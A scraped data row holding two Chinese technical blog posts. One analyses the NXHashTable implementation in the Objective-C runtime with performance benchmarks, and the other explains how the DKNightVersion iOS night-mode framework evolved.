<h4>_NXHashRehash</h4>
<p>如果哈希表在添加元素后，其中的数据多于 <code>buckets</code> 数量，就会对 <code>NXHashTable</code> 进行 <code>_NXHashRehash</code> 操作。</p>
<pre><code class=""objectivec"">static void _NXHashRehash (NXHashTable *table) {
    _NXHashRehashToCapacity (table, MORE_CAPACITY(table-&gt;nbBuckets));
}</code></pre>
<p>它调用 <code>_NXHashRehashToCapacity</code> 方法来扩大 <code>NXHashTable</code> 的容量（<code>HashBucket</code> 的个数）。</p>
<pre><code class=""c"">#define MORE_CAPACITY(b) (b*2+1)</code></pre>
<p>而 <code>MORE_CAPACITY</code> 会将当前哈希表的容量翻倍，并将新的容量传入 <code>_NXHashRehashToCapacity</code> 中：</p>
<pre><code class=""objectivec"">void _NXHashRehashToCapacity (NXHashTable *table, unsigned newCapacity) {
    NXHashTable    *old;
    NXHashState    state;
    void    *aux;
    __unused void *z = ZONE_FROM_PTR(table);

    old = ALLOCTABLE(z);
    old-&gt;prototype = table-&gt;prototype; old-&gt;count = table-&gt;count;
    old-&gt;nbBuckets = table-&gt;nbBuckets; old-&gt;buckets = table-&gt;buckets;
    table-&gt;nbBuckets = newCapacity;
    table-&gt;count = 0; table-&gt;buckets = ALLOCBUCKETS(z, table-&gt;nbBuckets);
    state = NXInitHashState (old);
    while (NXNextHashState (old, &amp;state, &amp;aux))
        (void) NXHashInsert (table, aux);
    freeBuckets (old, NO);
    
    free (old-&gt;buckets);
    free (old);
}</code></pre>
<ol>
<li><p>创建一个 <code>NXHashTable</code> 的指针指向原哈希表</p></li>
<li><p>改变哈希表的 <code>nbBuckets</code>，并重新初始化哈希表的 <code>buckets</code> 数组</p></li>
<li><p>重新将元素插入到哈希表中</p></li>
<li><p>释放原哈希表 <code>old</code> 以及 <code>buckets</code></p></li>
</ol>
<h4>NXHashState</h4>
<p>在将元素重新插入到哈希表中涉及了一个非常奇怪的结构体 <code>NXHashState</code>，这个结构体主要作用是遍历 <code>NXHashTable</code> 中的元素。</p>
<pre><code class=""objectivec"">typedef struct {
    int i;
    int j;
} NXHashState;</code></pre>
<p>我们可以使用如下的代码对哈希表中的元素进行遍历：</p>
<pre><code class=""objectivec""> unsigned count = 0;
 MyData     *data;
 NXHashState state = NXInitHashState(table);
 while (NXNextHashState(table, &amp;state, &amp;data)) {
    count++;
 }</code></pre>
<p>代码片段中调用了两个方法，分别是 <code>NXInitHashState</code> 以及 <code>NXNextHashState</code>：</p>
<pre><code class=""objectivec"">NXHashState NXInitHashState (NXHashTable *table) {
    NXHashState    state;

    state.i = table-&gt;nbBuckets;
    state.j = 0;
    return state;
};</code></pre>
<p><code>NXInitHashState</code> 会将 <code>NXHashState</code> 指向哈希表的最末端：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005075501"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-hashtable-hash-state-init"" title=""objc-hashtable-hash-state-init""></span></p>
<blockquote><p>这个位置其实并不属于 <code>NXHashTable</code>，它一定会为空。</p></blockquote>
<p>而每次调用 <code>NXNextHashState</code> 都会向『前』移动一次：</p>
<pre><code class=""objectivec"">int NXNextHashState (NXHashTable *table, NXHashState *state, void **data) {
    HashBucket        *buckets = (HashBucket *) table-&gt;buckets;

    while (state-&gt;j == 0) {
        if (state-&gt;i == 0) return NO;
        state-&gt;i--; state-&gt;j = buckets[state-&gt;i].count;
    }
    state-&gt;j--;
    buckets += state-&gt;i;
    *data = (void *) ((buckets-&gt;count == 1)
                      ? buckets-&gt;elements.one : buckets-&gt;elements.many[state-&gt;j]);
    return YES;
};</code></pre>
<p>下面的 gif 为我么么展示了每一次调用 <code>NXNextHashState</code> 方法之后当前的 <code>NXHashState</code>：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005075503"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-hashtable-hashstate-next"" title=""objc-hashtable-hashstate-next""></span></p>
<h3>NXHashRemove</h3>
<p>这里的 <code>NXHashRemove</code>在某种意义上是 <code>NXHashInsert</code> 的逆操作：</p>
<pre><code class=""objectivec"">void *NXHashRemove (NXHashTable *table, const void *data) {
    HashBucket    *bucket = BUCKETOF(table, data);
    unsigned    j = bucket-&gt;count;
    const void    **pairs;
    const void    **newt;
    __unused void *z = ZONE_FROM_PTR(table);

    if (! j) return NULL;
    if (j == 1) {
        if (! ISEQUAL(table, data, bucket-&gt;elements.one)) return NULL;
        data = bucket-&gt;elements.one;
        table-&gt;count--; bucket-&gt;count--; bucket-&gt;elements.one = NULL;
        return (void *) data;
    };
    pairs = bucket-&gt;elements.many;
    if (j == 2) {
        if (ISEQUAL(table, data, pairs[0])) {
            bucket-&gt;elements.one = pairs[1]; data = pairs[0];
        }
        else if (ISEQUAL(table, data, pairs[1])) {
            bucket-&gt;elements.one = pairs[0]; data = pairs[1];
        }
        else return NULL;
        FREEPAIRS (pairs);
        table-&gt;count--; bucket-&gt;count--;
        return (void *) data;
    };
    while (j--) {
        if (ISEQUAL(table, data, *pairs)) {
            data = *pairs;
            /* we shrink this bucket */
            newt = (bucket-&gt;count-1)
            ? ALLOCPAIRS(z, bucket-&gt;count-1) : NULL;
            if (bucket-&gt;count-1 != j)
                bcopy ((const char*)bucket-&gt;elements.many, (char*)newt, PTRSIZE*(bucket-&gt;count-j-1));
            if (j)
                bcopy ((const char*)(bucket-&gt;elements.many + bucket-&gt;count-j), (char*)(newt+bucket-&gt;count-j-1), PTRSIZE*j);
            FREEPAIRS (bucket-&gt;elements.many);
            table-&gt;count--; bucket-&gt;count--; bucket-&gt;elements.many = newt;
            return (void *) data;
        };
        pairs ++;
    };
    return NULL;
}</code></pre>
<p>它的实现也分为三种情况，不过在这里就不多说了。</p>
<h2>NXHashTable 的性能</h2>
<p>在已经熟悉了 <code>NXHashTable</code> 的具体实现之后，我们要分析插入<strong>不同数据量级</strong>的情况下，所需要的时间，这里是主程序的代码，分别测试了在 <code>100, 1000, 10000, 100000, 1000000, 2000000, 3000000, 5000000, 10000000</code> 数据下 <code>NXHashTable</code> 的性能表现：</p>
<pre><code class=""objectivec"">#import &lt;Foundation/Foundation.h&gt;
#import ""hashtable2.h""

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSArray&lt;NSNumber *&gt; *capacities = @[
            @100,
            @1000,
            @10000,
            @100000,
            @1000000,
            @2000000,
            @3000000,
            @5000000,
            @10000000
        ];

        for (NSNumber *capacity in capacities) {
            NXHashTable *hashTable = NXCreateHashTable(NXPtrPrototype, 0, NULL);
            NSDate *methodStart = [NSDate date];
            for (NSInteger i = 0; i &lt; capacity.integerValue; i++) {
                NSString *value = [NSString stringWithFormat:@""%ld"", (long)i];
                NXHashInsert(hashTable, (__bridge void *)value);
            }
            NSDate *methodFinish = [NSDate date];
            NSTimeInterval executionTime = [methodFinish timeIntervalSinceDate:methodStart];
            NSLog(@""Capacities: %@, executionTime = %f, meanTime = %.10f"", capacity, executionTime, executionTime / capacity.integerValue);

            free(hashTable);
        }

    }
    return 0;
}</code></pre>
<p>代码中初始化了一个 <code>capacities</code> 存储需要测量的数据量级，然后调用 <code>NXHashInsert</code> 方法将相当数量级的数据添加到哈希表中：</p>
<table>
<thead><tr>
<th align=""right"">Capacities</th>
<th align=""right"">Execution Time</th>
<th align=""right"">Mean Time</th>
</tr></thead>
<tbody>
<tr>
<td align=""right"">100</td>
<td align=""right"">0.000334</td>
<td align=""right"">0.0000033402</td>
</tr>
<tr>
<td align=""right"">1000</td>
<td align=""right"">0.001962</td>
<td align=""right"">0.0000019619</td>
</tr>
<tr>
<td align=""right"">10000</td>
<td align=""right"">0.022001</td>
<td align=""right"">0.0000022001</td>
</tr>
<tr>
<td align=""right"">100000</td>
<td align=""right"">0.349998</td>
<td align=""right"">0.0000035000</td>
</tr>
<tr>
<td align=""right"">1000000</td>
<td align=""right"">2.622551</td>
<td align=""right"">0.0000026226</td>
</tr>
<tr>
<td align=""right"">2000000</td>
<td align=""right"">4.165023</td>
<td align=""right"">0.0000020825</td>
</tr>
<tr>
<td align=""right"">3000000</td>
<td align=""right"">6.973098</td>
<td align=""right"">0.0000023244</td>
</tr>
<tr>
<td align=""right"">5000000</td>
<td align=""right"">13.179743</td>
<td align=""right"">0.0000026359</td>
</tr>
<tr>
<td align=""right""><strong>10000000</strong></td>
<td align=""right""><strong>53.387356</strong></td>
<td align=""right""><strong>0.0000053387</strong></td>
</tr>
</tbody>
</table>
<p>在对 <code>NXHashTable</code> 的性能测试中，当数据量小于 5000000 时，执行时间的增长还是线性的，平均时间也基本稳定，但是一旦数据量达到了千万级，执行时间就会出现显著的增长。</p>
<p>如果仅仅在哈希表中插入数据，相信其时间增长应该都是线性的，这里出现问题的原因推测是<strong>在对哈希表进行 Rehash 的时候，迁移原数据至新的数组所造成的</strong>。</p>
<p>如何避免哈希表的 Rehash 呢，重新回顾一下创建哈希表的函数：</p>
<pre><code class=""objectivec"">NXHashTable *NXCreateHashTable (NXHashTablePrototype prototype, unsigned capacity, const void *info);</code></pre>
<p>这个函数的签名中包含一个 <code>capacity</code> 的参数，我们在上面的代码中传入了 0，也就是最开始的 <code>buckets</code> 数为 0，但是它的数目并不是固定的，它会随着哈希表中数据的增多，逐渐变大。</p>
<blockquote><p><code>capacity</code> 只是一个提示，帮助 NXHashTable 了解其中会存储多少数据。</p></blockquote>
<p>如果在创建 <code>NXHashTable</code> 时传入 <code>capacity.integerValue</code>：</p>
<pre><code class=""objectivec"">  NXHashTable *hashTable = NXCreateHashTable(NXPtrPrototype, capacity.integerValue, NULL);</code></pre>
<p>重新运行代码，测量性能：</p>
<table>
<thead><tr>
<th align=""right"">Capacities</th>
<th align=""right"">Execution Time</th>
<th align=""right"">Mean Time</th>
</tr></thead>
<tbody>
<tr>
<td align=""right"">100</td>
<td align=""right"">0.000740</td>
<td align=""right"">0.0000073999</td>
</tr>
<tr>
<td align=""right"">1000</td>
<td align=""right"">0.003442</td>
<td align=""right"">0.0000034420</td>
</tr>
<tr>
<td align=""right"">10000</td>
<td align=""right"">0.023341</td>
<td align=""right"">0.0000023341</td>
</tr>
<tr>
<td align=""right"">100000</td>
<td align=""right"">0.215209</td>
<td align=""right"">0.0000021521</td>
</tr>
<tr>
<td align=""right"">1000000</td>
<td align=""right"">1.836802</td>
<td align=""right"">0.0000018368</td>
</tr>
<tr>
<td align=""right"">2000000</td>
<td align=""right"">3.683246</td>
<td align=""right"">0.0000018416</td>
</tr>
<tr>
<td align=""right"">3000000</td>
<td align=""right"">5.474610</td>
<td align=""right"">0.0000018249</td>
</tr>
<tr>
<td align=""right"">5000000</td>
<td align=""right"">10.576254</td>
<td align=""right"">0.0000021153</td>
</tr>
<tr>
<td align=""right"">10000000</td>
<td align=""right"">46.725459</td>
<td align=""right"">0.0000046725</td>
</tr>
</tbody>
</table>
<p>虽然在测试 <code>10,000,000</code> 数据时其平均时间依然是 <code>5,000,000</code> 时的二倍，不过整体的性能都有所提升，然而这部分性能的损耗暂时还不是很清楚原因。</p>
<p>如果我们使用 Instrument 对有无 <code>capacity</code> 的情况进行比较（这是在使用 <code>2,000,000</code> 数据时进行的测试）：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006953311?w=712&amp;h=527"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-hashtable-instrument"" title=""objc-hashtable-instrument""></span></p>
<p>没有传入 <code>capacity</code> 的哈希表会在多次插入之后出现一个峰值（由于 Rehash 引起的，其宽度就是 Rehash 使用的时间），而传入 <code>capacity</code> 的哈希表会在代码刚运行时就初始化足够大的数组。</p>
<h2>NSMutableArray 性能</h2>
<blockquote><p>这部分只算是一个小插曲，你可以选择跳过这一小节的内容。</p></blockquote>
<p><code>NSMutableArray</code> 的构造器 <code>- (instancetype)initWithCapacity:(NSUInteger)numItems</code> 也有一个参数 <code>capacity</code>，虽然数组和哈希表是两种数据结构。</p>
<blockquote><p>不过我们这里主要研究的是：<strong>传入 <code>capacity</code> 是否会对性能造成影响</strong>。</p></blockquote>
<p>首先是使用 <code>init</code> 创建的 <code>NSMutableArray</code> 数组，也就是没有传入 <code>capacity</code>：</p>
<table>
<thead><tr>
<th align=""right"">Capacities</th>
<th align=""right"">Execution Time</th>
<th align=""right"">Mean Time</th>
</tr></thead>
<tbody>
<tr>
<td align=""right"">100</td>
<td align=""right"">0.000539</td>
<td align=""right"">0.0000053900</td>
</tr>
<tr>
<td align=""right"">1000</td>
<td align=""right"">0.003185</td>
<td align=""right"">0.0000031850</td>
</tr>
<tr>
<td align=""right"">10000</td>
<td align=""right"">0.074033</td>
<td align=""right"">0.0000074033</td>
</tr>
<tr>
<td align=""right"">100000</td>
<td align=""right"">0.370899</td>
<td align=""right"">0.0000037090</td>
</tr>
<tr>
<td align=""right"">1000000</td>
<td align=""right"">1.504855</td>
<td align=""right"">0.0000015049</td>
</tr>
<tr>
<td align=""right"">2000000</td>
<td align=""right"">2.852519</td>
<td align=""right"">0.0000014263</td>
</tr>
<tr>
<td align=""right"">3000000</td>
<td align=""right"">3.995536</td>
<td align=""right"">0.0000013318</td>
</tr>
<tr>
<td align=""right"">5000000</td>
<td align=""right"">6.833879</td>
<td align=""right"">0.0000013668</td>
</tr>
<tr>
<td align=""right"">10000000</td>
<td align=""right"">14.444605</td>
<td align=""right"">0.0000014445</td>
</tr>
</tbody>
</table>
<p>下面是使用 <code>initWithCapacity:</code> 创建的数组：</p>
<table>
<thead><tr>
<th align=""right"">Capacities</th>
<th align=""right"">Execution Time</th>
<th align=""right"">Mean Time</th>
</tr></thead>
<tbody>
<tr>
<td align=""right"">100</td>
<td align=""right"">0.000256</td>
<td align=""right"">0.0000025600</td>
</tr>
<tr>
<td align=""right"">1000</td>
<td align=""right"">0.001775</td>
<td align=""right"">0.0000017750</td>
</tr>
<tr>
<td align=""right"">10000</td>
<td align=""right"">0.015906</td>
<td align=""right"">0.0000015906</td>
</tr>
<tr>
<td align=""right"">100000</td>
<td align=""right"">0.174376</td>
<td align=""right"">0.0000017438</td>
</tr>
<tr>
<td align=""right"">1000000</td>
<td align=""right"">1.650481</td>
<td align=""right"">0.0000016505</td>
</tr>
<tr>
<td align=""right"">2000000</td>
<td align=""right"">2.802310</td>
<td align=""right"">0.0000014012</td>
</tr>
<tr>
<td align=""right"">3000000</td>
<td align=""right"">4.451261</td>
<td align=""right"">0.0000014838</td>
</tr>
<tr>
<td align=""right"">5000000</td>
<td align=""right"">7.093753</td>
<td align=""right"">0.0000014188</td>
</tr>
<tr>
<td align=""right"">10000000</td>
<td align=""right"">14.598415</td>
<td align=""right"">0.0000014598</td>
</tr>
</tbody>
</table>
<p>你可以在表格中看到，两者在执行效率上并没有显著的差异或者区别。</p>
<p>但是如果使用 instrument 来查看两者的内存分配，可以很明显的看到，没有传入 <code>capacity</code> 的 <code>NSMutableArray</code> 会在可变数组内存占用增加前出现一个<strong>短暂的内存分配峰值</strong>。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005075505"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-hashtable-nsarray-instrument"" title=""objc-hashtable-nsarray-instrument""></span></p>
<p>导致这一现象的原始可能是：在将原数组中的内容移入新数组时，<strong>临时变量申请了大量的内存控件</strong>。</p>
<blockquote><p>在之后关于 CoreFoundation 源代码分析的文中会介绍它们是怎么实现的。</p></blockquote>
<h2>NXHashTable 的应用</h2>
<p>在整个 objc/runtime 中，作为<strong>私有</strong>的数据结构 <code>NXHashTable</code>，直接使用了它的就是<strong>存储所有类或者元类</strong>的哈希表（在这里会忽略对元类的存储，因为实现几乎完全相同）：</p>
<pre><code class=""objectivec"">static NXHashTable *realized_class_hash = nil;</code></pre>
<p>我么可以使用 <code>objc_copyClassList</code> 获取类的数组：</p>
<pre><code class=""objectivec"">Class *
objc_copyClassList(unsigned int *outCount)
{
    rwlock_writer_t lock(runtimeLock);

    realizeAllClasses();

    Class *result = nil;
    NXHashTable *classes = realizedClasses();
    unsigned int count = NXCountHashTable(classes);

    if (count &gt; 0) {
        Class cls;
        NXHashState state = NXInitHashState(classes);
        result = (Class *)malloc((1+count) * sizeof(Class));
        count = 0;
        while (NXNextHashState(classes, &amp;state, (void **)&amp;cls)) {
            result[count++] = cls;
        }
        result[count] = nil;
    }
        
    if (outCount) *outCount = count;
    return result;
}</code></pre>
<ol>
<li><p>调用 <code>realizedClasses</code> 返回 <code>realized_class_hash</code> 哈希表</p></li>
<li><p>使用 <code>NSHashState</code> 遍历 <code>realized_class_hash</code> 中的类，并将所有的类存入 <code>result</code></p></li>
</ol>
<p>接下来使用上面的方法，打印出 <code>realized_class_hash</code> 中存储的所有类：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005075507"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-hashtable-copy-class-list"" title=""objc-hashtable-copy-class-list""></span></p>
<h2>小结</h2>
<blockquote><p><code>NXHashTable</code> 在 OS X 10.1 中就已经标记为弃用了，但是依旧支持着 runtime 底层的工作。</p></blockquote>
<p><code>NXHashTable</code> 可以说有着<strong>非常非常</strong>久远的历史了，最早可以追溯到将近 30 多年前 NeXT 时代：</p>
<pre><code class=""c"">// hashtable2.mm 文件中

hashtable2.m
Copyright 1989-1996 NeXT Software, Inc.
Created by Bertrand Serlet, Feb 89</code></pre>
<p><code>NSHashTable</code> 对哈希表的实现还是非常优雅的，可以说非常标准的使用了<a href=""https://en.wikipedia.org/wiki/Hash_table#Separate_chaining_with_linked_lists"" rel=""nofollow noreferrer"">拉链法</a>实现哈希表。</p>
<p>不过现在，我们会使用 <code>NSHashTable</code> 来取代这个上古时代的产物。</p>
<blockquote><p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a><br>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p></blockquote>

                ", 上古时代 Objective-C 中哈希表的实现,1531972029,135,1,810,1,1,https://segmentfault.com/a/1190000005075494
103,1,0,6,"
                    
<blockquote><p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a><br>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p></blockquote>
<p>从开始写 <a href=""https://github.com/Draveness/DKNightVersion"" rel=""nofollow noreferrer"">DKNightVersion</a> 这个框架到现在已经将近一年了，目前整个框架的设计也趋于稳定。</p>
<p>其实夜间模式的实现就是相当于<strong>多主题加颜色管理</strong>。而最新版本的 <a href=""https://github.com/Draveness/DKNightVersion"" rel=""nofollow noreferrer"">DKNightVersion</a> 已经很好的解决了这个问题。</p>
<p>在正式介绍目前版本的实现之前，我会先简单介绍一下 1.0 时代的 DKNightVersion 的实现，为各位读者带来一些新的思路，也确实想梳理一下这个框架是如何演变的。</p>
<blockquote><p>我们会以对 <code>backgroundColor</code> 为例说明整个框架的工作原理。</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006770705"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>方法调剂的版本</h2>
<p>如何在不改变原有的架构，甚至不改变原有的代码的基础上，为应用优雅地添加夜间模式成为很多开发者不得不面对的问题。这也是 1.0 时代的 DKNightVersion 想要实现的目标。</p>
<p>其核心思路就是<strong>使用方法调剂修改 <code>backgroundColor</code> 的存取方法</strong>。</p>
<h3>使用 nightBackgroundColor</h3>
<p>在思考之后，我想到，想要在不改动原有代码的基础上实现夜间模式只能通过在<strong>分类</strong>中添加 <code>nightBackgroundColor</code> 属性，并且使用方法调剂改变 <code>backgroundColor</code> 的 setter 方法。</p>
<pre><code class=""objectivec"">- (void)hook_setBackgroundColor:(UIColor*)backgroundColor {
    if ([DKNightVersionManager currentThemeVersion] == DKThemeVersionNormal) {
        [self setNormalBackgroundColor:backgroundColor];
    }
    [self hook_setBackgroundColor:backgroundColor];
}</code></pre>
<p>在当前主题为 <code>DKThemeVersionNormal</code> 时，将颜色保存至 <code>normalBackgroundColor</code> 中，然后再调用原 <code>backgroundColor</code> 的 setter 方法，更新视图的颜色。</p>
<h3>DKNightVersionManager</h3>
<p>这里只解决了颜色设置的问题，下面会说明，如果在主题改变时，实时更新颜色，而不用重新进入当前页面。</p>
<p>整个 DKNightVersion 都是由一个 <code>DKNightVersionManager</code> 的单例来管理的，而它的主要工作就是负责<strong>改变应用的主题</strong>、并在主题改变时<strong>通知其它视图更新颜色</strong>：</p>
<pre><code class=""objectivec"">- (void)changeColor:(id &lt;DKNightVersionChangeColorProtocol&gt;)object {
    if ([object respondsToSelector:@selector(changeColor)]) {
        [object changeColor];
    }
    if ([object respondsToSelector:@selector(subviews)]) {
        if (![object subviews]) {
            // Basic case, do nothing.
            return;
        } else {
            for (id subview in [object subviews]) {
                // recursive darken all the subviews of current view.
                [self changeColor:subview];
                if ([subview respondsToSelector:@selector(changeColor)]) {
                    [subview changeColor];
                }
            }
        }
    }
}</code></pre>
<p>如果主题更新，那么就会递归地调用 <code>changeColor</code> 方法，刷新全部的视图颜色，而这个方法的实现比较简单：</p>
<pre><code class=""objectivec"">- (void)changeColor {
    if ([DKNightVersionManager currentThemeVersion] == DKThemeVersionNormal) {
        self.backgroundColor = self.normalBackgroundColor;
    } else {
        self.backgroundColor = self.nightBackgroundColor;
    }
}</code></pre>
<p>上面就是整个框架在 1.0 版本时的实现思路。不过这个版本的 DKNightVersion 在实际应用中会有比较多的问题：</p>
<ol>
<li><p>在高速滚动的 <code>scrollView</code> 上面来回切换夜间模式，会出现颜色错乱的问题</p></li>
<li><p>由于对 <code>backgroundColor</code> 属性进行<strong>不合适的</strong>方法调剂，其行为无法预测，比如：在设置颜色后，再取出，不一定与设置时传入的颜色相同</p></li>
<li><p>无法适配第三方 UI 控件</p></li>
</ol>
<h2>使用色表的版本</h2>
<p>为了解决 1.0 中的各种问题，我决定在 2.0 版本中放弃对 <code>nightBackgroundColor</code> 的使用，并且重新设计底层的实现，转而使用更为<strong>稳定</strong>、<strong>安全</strong>的方法实现夜间模式，先看一下效果图：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006770705"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<blockquote><p>新的实现不仅能够支持夜间模式，而且能够支持多主题。</p></blockquote>
<h3>DKColorPicker</h3>
<p>与上一个版本实现上的不同，在 2.0 中删除了全部的 <code>nightBackgroundColor</code>，使用一个名为 <code>dk_backgroundColorPicker</code> 的属性取代它。</p>
<pre><code class=""objectivec"">@property (nonatomic, copy) DKColorPicker dk_backgroundColorPicker;</code></pre>
<p>这个属性其实就是一个 block，它接收参数 <code>DKThemeVersion *themeVersion</code>，但是会返回一个 <code>UIColor *</code>：</p>
<blockquote><p>在第一次传入 picker 或者每次主题改变时，都会将当前主题 <code>DKThemeVersion</code> 传入 picker 并执行，然后，将得到的 <code>UIColor</code> 赋值给对应的属性 <code>backgroundColor</code> 更新视图颜色。</p></blockquote>
<pre><code class=""objectivec"">typedef UIColor *(^DKColorPicker)(DKThemeVersion *themeVersion);</code></pre>
<p>比如下面使用 <code>DKColorPickerWithRGB</code> 创建一个临时的 <code>DKColorPicker</code>：</p>
<ol>
<li><p>在 <code>DKThemeVersionNormal</code> 时返回 <code>0xffffff</code></p></li>
<li><p>在 <code>DKThemeVersionNight</code> 时返回 <code>0x343434</code></p></li>
<li><p>在自定义的主题下返回 <code>0xfafafa</code> （这里的顺序与色表中主题的顺序有关）</p></li>
</ol>
<pre><code class=""objectivec"">cell.dk_backgroundColorPicker = DKColorPickerWithRGB(0xffffff, 0x343434, 0xfafafa);</code></pre>
<p>同时，每一个对象还持有一个 <code>pickers</code> 数组，来存储自己的全部 <code>DKColorPicker</code>：</p>
<pre><code class=""objectivec"">@interface NSObject ()

@property (nonatomic, strong) NSMutableDictionary&lt;NSString *, DKColorPicker&gt; *pickers;

@end</code></pre>
<p>在第一次使用这个属性时，当前对象注册为 <code>DKNightVersionThemeChangingNotificaiton</code> 通知的观察者。</p>
<p>在每次收到通知时，都会调用 <code>night_update</code> 方法，将当前主题传入 <code>DKColorPicker</code>，并再次执行，并将结果传入对应的属性 <code>[self performSelector:sel withObject:result]</code>。</p>
<pre><code class=""objectivec"">- (void)night_updateColor {
    [self.pickers enumerateKeysAndObjectsUsingBlock:^(NSString * _Nonnull selector, DKColorPicker  _Nonnull picker, BOOL * _Nonnull stop) {
        SEL sel = NSSelectorFromString(selector);
        id result = picker(self.dk_manager.themeVersion);
        [UIView animateWithDuration:DKNightVersionAnimationDuration
                         animations:^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored ""-Warc-performSelector-leaks""
                             [self performSelector:sel withObject:result];
#pragma clang diagnostic pop
                         }];
    }];
}</code></pre>
<p>也就是说，在每次改变主题的时候，都会发出通知。</p>
<h3>DKColorTable</h3>
<p>虽然我们在上面临时创建了一些 <code>DKColorPicker</code>。不过在 <code>DKNightVersion</code> 中，我更推荐使用色表，来减少相同的 <code>DKColorPicker</code> 的创建，并且能够更好地管理整个应用中的颜色：</p>
<pre><code class=""objectivec"">NORMAL   NIGHT    RED
#ffffff  #343434  #fafafa BG
#aaaaaa  #313131  #aaaaaa SEP
#0000ff  #ffffff  #fa0000 TINT
#000000  #ffffff  #000000 TEXT
#ffffff  #444444  #ffffff BAR</code></pre>
<p>上面就是默认色表文件 <code>DKColorTable.txt</code> 中的内容，其中，第一行表示主题，<code>NORMAL</code> 主题必须存在，而且必须为第一列，而最右面的 <code>BG</code>、<code>SEP</code> 就是对应 <code>DKColorPicker</code> 的 key。</p>
<pre><code class=""objectivec"">self.tableView.dk_backgroundColorPicker =  DKColorPickerWithKey(BG);</code></pre>
<p>在使用时，上面的代码就相当于返回了一个在 <code>NORMAL</code> 时返回 <code>#ffffff</code>、<code>NIGHT</code> 时返回 <code>#343434</code> 以及 <code>RED</code> 时返回 <code>#fafafa</code> 的 <code>DKColorPicker</code>。</p>
<h3>pickerify</h3>
<p>虽然说，我们使用色表以及 <code>DKColorPicker</code> 解决了，但是，到目前为止我们还没有解决第三方框架的问题。</p>
<p>比如我们使用了某个第三方框架，或者自己添加了某个 <code>color</code> 属性，比如说：</p>
<pre><code class=""objectivec"">@interface DKView ()

@property (nonatomic, strong) UIColor *weirdColor;

@end</code></pre>
<p><code>weirdColor</code> 并没有对应的 <code>DKColorPicker</code>，但是，我们可以通过 <code>pickerify</code> 在想要使用 <code>dk_weirdColorPicker</code> 的地方生成这个对应的 picker：</p>
<pre><code class=""objectivec"">@pickerify(DKView, weirdColor);</code></pre>
<p>然后，我们就可以使用 <code>dk_weirdColorPicker</code> 属性了：</p>
<pre><code class=""objectivec"">view.dk_weirdColorPicker = DKColorPickerWithKey(BG);</code></pre>
<p><code>pickerify</code> 其实是一个宏：</p>
<pre><code class=""objectivec"">#define pickerify(KLASS, PROPERTY) interface \
    KLASS (Night) \
    @property (nonatomic, copy, setter = dk_set ## PROPERTY ## Picker:) DKColorPicker dk_ ## PROPERTY ## Picker; \
    @end \
    @interface \
    KLASS () \
    @property (nonatomic, strong) NSMutableDictionary&lt;NSString *, DKColorPicker&gt; *pickers; \
    @end \
    @implementation \
    KLASS (Night) \
    - (DKColorPicker)dk_ ## PROPERTY ## Picker { \
        return objc_getAssociatedObject(self, @selector(dk_ ## PROPERTY ## Picker)); \
    } \
    - (void)dk_set ## PROPERTY ## Picker:(DKColorPicker)picker { \
        objc_setAssociatedObject(self, @selector(dk_ ## PROPERTY ## Picker), picker, OBJC_ASSOCIATION_COPY_NONATOMIC); \
        [self setValue:picker(self.dk_manager.themeVersion) forKeyPath:@keypath(self, PROPERTY)];\
        [self.pickers setValue:[picker copy] forKey:_DKSetterWithPROPERTYerty(@#PROPERTY)]; \
    } \
    @end</code></pre>
<p>这个宏根据传入的类和属性名，为我们生成了对应 <code>picker</code> 的存取方法，它也可以说是一种元编程的手段。</p>
<blockquote><p>这里生成的 setter 方法不是标准意义上的驼峰命名法 <code>dk_setweirdColorPicker:</code>，因为我不知道怎么才能让大写首字母之后的属性添加到这里（如果各位读者有解决方案，欢迎提 PR 或者 issue）。</p></blockquote>
<h2>嵌入式 Ruby</h2>
<p>由于框架中很多的代码，都是重复的，所以在这里使用了<strong>嵌入式 Ruby 模板</strong>来生成对应的文件 <code>color.m.irb</code>：</p>
<pre><code class=""objectivec"">//
//  &lt;%= klass.name %&gt;+Night.m
//  &lt;%= klass.name %&gt;+Night
//
//  Copyright (c) 2015 Draveness. All rights reserved.
//
//  These files are generated by ruby script, if you want to modify code
//  in this file, you are supposed to update the ruby code, run it and
//  test it. And finally open a pull request.

#import ""&lt;%= klass.name %&gt;+Night.h""
#import ""DKNightVersionManager.h""
#import &lt;objc/runtime.h&gt;

@interface &lt;%= klass.name %&gt; ()

@property (nonatomic, strong) NSMutableDictionary&lt;NSString *, DKColorPicker&gt; *pickers;

@end

@implementation &lt;%= klass.name %&gt; (Night)

&lt;% klass.properties.each do |property| %&gt;&lt;%= """"""
- (DKColorPicker)dk_#{property.name}Picker {
    return objc_getAssociatedObject(self, @selector(dk_#{property.name}Picker));
}

- (void)dk_set#{property.cap_name}Picker:(DKColorPicker)picker {
    objc_setAssociatedObject(self, @selector(dk_#{property.name}Picker), picker, OBJC_ASSOCIATION_COPY_NONATOMIC);
    self.#{property.name} = picker(self.dk_manager.themeVersion);
    [self.pickers setValue:[picker copy] forKey:@\""#{property.setter}\""];
}
"""""" %&gt;&lt;% end %&gt;

@end</code></pre>
